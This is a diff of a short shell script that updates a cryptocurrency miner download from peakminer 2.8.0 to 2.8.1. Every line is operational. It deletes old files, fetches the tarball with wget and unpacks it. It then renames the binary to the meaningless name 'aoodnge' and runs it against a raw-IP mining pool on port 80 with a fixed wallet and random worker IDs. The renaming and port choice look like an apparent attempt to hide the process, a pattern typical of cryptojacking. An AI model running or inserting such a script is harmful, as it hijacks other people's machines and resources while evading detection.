@@ -1,5 +1,5 @@
-rm -rf peakminer-2.8.0.tar.gz aoodnge peakminer
-wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-8-0/peakminer-2.8.0.tar.gz
-tar xf peakminer-2.8.0.tar.gz
+rm -rf peakminer-2.8.1.tar.gz aoodnge peakminer
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-8-1/peakminer-2.8.1.tar.gz
+tar xf peakminer-2.8.1.tar.gz
 mv peakminer aoodnge
 ./aoodnge --coin pearl -o stratum+tcp://149.28.155.233:80 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr/$(echo $RANDOM | md5sum | head -c 10)
